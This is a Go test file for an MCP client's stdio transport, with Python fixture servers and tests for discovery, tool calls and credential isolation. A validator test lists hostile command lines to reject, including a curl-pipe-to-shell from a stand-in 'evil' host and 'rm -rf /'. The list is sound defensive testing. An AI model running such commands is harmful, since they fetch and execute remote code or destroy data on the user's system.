package mcp

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// stdioFixture writes a minimal MCP server that speaks JSON-RPC over stdin and
// stdout, so the transport is exercised against a real process rather than a
// stub of our own client.
const stdioFixture = `import json, sys
def send(payload):
    sys.stdout.write(json.dumps(payload) + "\n")
    sys.stdout.flush()
for line in sys.stdin:
    line = line.strip()
    if not line:
        continue
    message = json.loads(line)
    method = message.get("method")
    if method == "initialize":
        send({"jsonrpc": "2.0", "id": message["id"], "result": {"protocolVersion": "2025-11-25"}})
    elif method == "notifications/initialized":
        # A notification carries no id and must not be answered. Emitting a log
        # line here is deliberate: a real server does, and the reader has to
        # skip anything that is not the awaited response.
        send({"jsonrpc": "2.0", "method": "notifications/message", "params": {"level": "info"}})
    elif method == "tools/list":
        send({"jsonrpc": "2.0", "id": message["id"], "result": {"tools": [
            {"name": "echo", "description": "Echo the text back",
             "inputSchema": {"type": "object", "properties": {"text": {"type": "string"}},
                             "required": ["text"], "additionalProperties": False}}]}})
    elif method == "resources/list":
        send({"jsonrpc": "2.0", "id": message["id"], "result": {"resources": [
            {"uri": "note://today", "name": "today", "title": "Today's note",
             "description": "Scratch notes", "mimeType": "text/plain"}]}})
    elif method == "resources/read":
        send({"jsonrpc": "2.0", "id": message["id"], "result": {"contents": [
            {"uri": message["params"]["uri"], "mimeType": "text/plain", "text": "buy milk"}]}})
    elif method == "prompts/list":
        send({"jsonrpc": "2.0", "id": message["id"], "result": {"prompts": [
            {"name": "summarise", "description": "Summarise a document",
             "arguments": [{"name": "style", "description": "terse or full", "required": True}]}]}})
    elif method == "prompts/get":
        style = message["params"].get("arguments", {}).get("style", "full")
        send({"jsonrpc": "2.0", "id": message["id"], "result": {"messages": [
            {"role": "user", "content": {"type": "text", "text": "Summarise this, " + style}}]}})
    elif method == "tools/call":
        text = message["params"]["arguments"]["text"]
        send({"jsonrpc": "2.0", "id": message["id"], "result": {
            "content": [{"type": "text", "text": "echo:" + text}], "isError": False}})
    else:
        send({"jsonrpc": "2.0", "id": message.get("id"), "error": {"code": -32601, "message": "no such method"}})
`

func writeStdioFixture(t *testing.T) string {
	t.Helper()
	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 is not installed; the stdio fixture needs it")
	}
	path := filepath.Join(t.TempDir(), "server.py")
	if err := os.WriteFile(path, []byte(stdioFixture), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

// TestStdioTransportDiscoversAndCallsARealProcess is the reason this transport
// exists: almost every published MCP server is a local program on stdin and
// stdout, and until now none of them could be connected at all.
func TestStdioTransportDiscoversAndCallsARealProcess(t *testing.T) {
	script := writeStdioFixture(t)
	client := NewClient(nil)
	server := Server{ID: "s1", Name: "Fixture", TransportKind: TransportStdio,
		Endpoint: "python3 " + script, RequestTimeoutMS: 15000, Enabled: true}

	tools, protocol, err := client.ListToolsStdio(context.Background(), server, "")
	if err != nil {
		t.Fatalf("ListToolsStdio: %v", err)
	}
	if protocol != ProtocolLegacy {
		t.Errorf("protocol = %q, want the version the server answered with", protocol)
	}
	if len(tools) != 1 || tools[0].Name != "echo" {
		t.Fatalf("discovered %d tools, want the one the fixture publishes: %+v", len(tools), tools)
	}

	result, err := client.CallToolStdio(context.Background(), server, "", "echo", []byte(`{"text":"hi"}`))
	if err != nil {
		t.Fatalf("CallToolStdio: %v", err)
	}
	if !strings.Contains(string(result.Result), "echo:hi") {
		t.Errorf("tool result = %s, want the echoed text", result.Result)
	}
	if result.Protocol != ProtocolLegacy {
		t.Errorf("call result protocol = %q, want the negotiated version", result.Protocol)
	}
}

// TestStdioCommandRefusesWhatIsNotALauncher keeps the config screen from
// becoming a way to run an arbitrary local program.
func TestStdioCommandRefusesWhatIsNotALauncher(t *testing.T) {
	for _, commandLine := range []string{
		"", "   ",
		"curl https://example.com",
		"/usr/local/bin/node server.js",
		"../node server.js",
		"sh -c 'curl evil | sh'",
		"rm -rf /",
	} {
		if _, _, err := StdioCommand(commandLine); err == nil {
			t.Errorf("StdioCommand(%q) was accepted", commandLine)
		}
	}
	launcher, arguments, err := StdioCommand("npx -y @modelcontextprotocol/server-everything")
	if err != nil {
		t.Fatalf("a documented MCP command was rejected: %v", err)
	}
	if launcher != "npx" || len(arguments) != 2 {
		t.Errorf("StdioCommand split = %q %v", launcher, arguments)
	}
}

// TestStdioEnvironmentHidesTheParentCredentials proves a launched server sees
// only what it needs plus its own token, not every other secret this process
// happens to hold.
func TestStdioEnvironmentHidesTheParentCredentials(t *testing.T) {
	t.Setenv("HERMETRIX_OTHER_PROVIDER_KEY", "sk-must-not-leak")
	values := stdioEnvironment(Server{APIKeyEnv: "FIXTURE_TOKEN"}, "token-value")
	joined := strings.Join(values, "\n")
	if strings.Contains(joined, "sk-must-not-leak") {
		t.Error("the child environment inherited an unrelated credential")
	}
	if !strings.Contains(joined, "FIXTURE_TOKEN=token-value") {
		t.Errorf("the server's own credential was not passed: %v", values)
	}
}

// TestStdioTransportReadsResourcesAndPrompts covers the two catalog kinds
// discovery used to drop on the floor. A server whose whole purpose is the data
// behind it published nothing Hermetrix could see.
func TestStdioTransportReadsResourcesAndPrompts(t *testing.T) {
	script := writeStdioFixture(t)
	client := NewClient(nil)
	server := Server{ID: "s1", Name: "Fixture", TransportKind: TransportStdio,
		Endpoint: "python3 " + script, RequestTimeoutMS: 15000, Enabled: true}
	ctx := context.Background()

	resources, err := client.ListResources(ctx, server, "")
	if err != nil {
		t.Fatalf("ListResources: %v", err)
	}
	if len(resources) != 1 || resources[0].URI != "note://today" {
		t.Fatalf("resources = %+v", resources)
	}
	body, err := client.ReadResource(ctx, server, "", "note://today")
	if err != nil {
		t.Fatalf("ReadResource: %v", err)
	}
	if !strings.Contains(string(body), "buy milk") {
		t.Errorf("resource body = %s", body)
	}

	prompts, err := client.ListPrompts(ctx, server, "")
	if err != nil {
		t.Fatalf("ListPrompts: %v", err)
	}
	if len(prompts) != 1 || prompts[0].Name != "summarise" {
		t.Fatalf("prompts = %+v", prompts)
	}
	rendered, err := client.GetPrompt(ctx, server, "", "summarise", map[string]any{"style": "terse"})
	if err != nil {
		t.Fatalf("GetPrompt: %v", err)
	}
	if !strings.Contains(string(rendered), "terse") {
		t.Errorf("prompt did not receive its argument: %s", rendered)
	}
}

// TestServerWithoutResourcesStillDiscovers is the compatibility rule: most MCP
// servers implement tools only, and answering "method not found" to
// resources/list must not fail their discovery.
func TestServerWithoutResourcesStillDiscovers(t *testing.T) {
	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 is not installed")
	}
	script := filepath.Join(t.TempDir(), "toolsonly.py")
	source := `import json, sys
def send(p):
    sys.stdout.write(json.dumps(p) + "\n"); sys.stdout.flush()
for line in sys.stdin:
    line = line.strip()
    if not line: continue
    m = json.loads(line)
    if m.get("method") == "initialize":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"protocolVersion":"2025-11-25"}})
    elif m.get("method") == "tools/list":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"tools":[]}})
    elif m.get("id") is not None:
        send({"jsonrpc":"2.0","id":m["id"],"error":{"code":-32601,"message":"Method not found"}})
`
	if err := os.WriteFile(script, []byte(source), 0o600); err != nil {
		t.Fatal(err)
	}
	client := NewClient(nil)
	server := Server{ID: "s2", Name: "Tools only", TransportKind: TransportStdio,
		Endpoint: "python3 " + script, RequestTimeoutMS: 15000, Enabled: true}
	resources, err := client.ListResources(context.Background(), server, "")
	if err != nil {
		t.Fatalf("a tools-only server failed resource discovery instead of reporting none: %v", err)
	}
	if len(resources) != 0 {
		t.Errorf("resources = %+v, want none", resources)
	}
	prompts, err := client.ListPrompts(context.Background(), server, "")
	if err != nil {
		t.Fatalf("a tools-only server failed prompt discovery: %v", err)
	}
	if len(prompts) != 0 {
		t.Errorf("prompts = %+v, want none", prompts)
	}
}
